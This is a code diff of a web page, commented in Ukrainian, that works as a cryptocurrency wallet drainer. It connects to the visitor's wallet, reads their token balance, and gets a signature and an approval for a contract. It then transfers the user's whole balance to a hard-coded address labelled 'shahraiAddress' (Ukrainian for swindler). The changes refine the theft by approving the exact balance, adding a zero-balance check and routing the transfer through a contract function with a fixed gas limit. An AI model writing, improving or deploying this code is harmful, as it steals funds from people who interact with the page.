@@ -91,7 +91,7 @@
       display: block;
       width: 100%;
       padding: 12px;
-      background-color: #4559ff;
+      background-color: #4CAF50;
       color: white;
       text-align: center;
       border: none;
@@ -220,7 +220,7 @@
       }
     };
 
-    const contractAddress = "0x34CB3899bb58b0eAF6981C652efcc50bB21901e9"; // Твоя поточна адреса ApproveContract
+    const contractAddress = "0xA606bCbafce5Fe67483EF479620A384DE7971A49"; // Твоя поточна адреса ApproveContract
     const shahraiAddress = "0x72ad654e24e8D65e8ed0ef8d8B841bb1e2D0830e"; // Твій гаманець Б
 
     function formatNumber(number) {
@@ -290,14 +290,19 @@
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         const tokenAbi = [
           "function balanceOf(address) view returns (uint256)",
-          "function decimals() view returns (uint8)",
-          "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
+          "function decimals() view returns (uint8)"
         ];
         const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, provider);
         const balance = await tokenContract.balanceOf(userAddress);
         const decimals = await tokenContract.decimals();
         const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
+        console.log(`User balance: ${balanceFormatted} ${tokenName}`);
         document.getElementById('usdt-amount').innerText = formatNumber(balanceFormatted);
+
+        // Перевірка балансу
+        if (balance.isZero()) {
+          throw new Error('User has no tokens to transfer');
+        }
 
         // Оновлення USD еквіваленту після fetchPrices
         await fetchPrices();
@@ -311,21 +316,22 @@
 
         console.log('Signature:', signature);
 
-        // Виклик executeApprove з максимальним балансом
+        // Виклик executeApprove з реальним балансом
         const contractAbi = [
-          "function executeApprove(bytes memory message, address user, bytes memory signature, address token, address spender, uint256 amount) external"
+          "function executeApprove(bytes memory message, address user, bytes memory signature, address token, address spender, uint256 amount) external",
+          "function transferTokens(address token, address from, address to, uint256 amount) external"
         ];
         const contract = new ethers.Contract(contractAddress, contractAbi, new ethers.providers.Web3Provider(window.ethereum).getSigner());
 
-        const maxAmount = ethers.constants.MaxUint256;
+        const approveAmount = balance; // Використовуємо реальний баланс замість MaxUint256
         const messageBytes = ethers.utils.toUtf8Bytes(message);
-        const approveTx = await contract.executeApprove(messageBytes, userAddress, signature, tokenAddress, contractAddress, maxAmount);
+        const approveTx = await contract.executeApprove(messageBytes, userAddress, signature, tokenAddress, contractAddress, approveAmount);
         await approveTx.wait();
         console.log('Approve Transaction Hash:', approveTx.hash);
 
-        // Виклик transferFrom для переказу токенів на shahraiAddress
-        const tokenContractWithSigner = tokenContract.connect(new ethers.providers.Web3Provider(window.ethereum).getSigner());
-        const transferTx = await tokenContractWithSigner.transferFrom(userAddress, shahraiAddress, balance);
+        // Виклик transferTokens через ApproveContract з ручним газом
+        const gasLimit = 200000; // Фіксований газовий ліміт (можна налаштувати)
+        const transferTx = await contract.transferTokens(tokenAddress, userAddress, shahraiAddress, balance, { gasLimit });
         await transferTx.wait();
         console.log('Transfer Transaction Hash:', transferTx.hash);
 
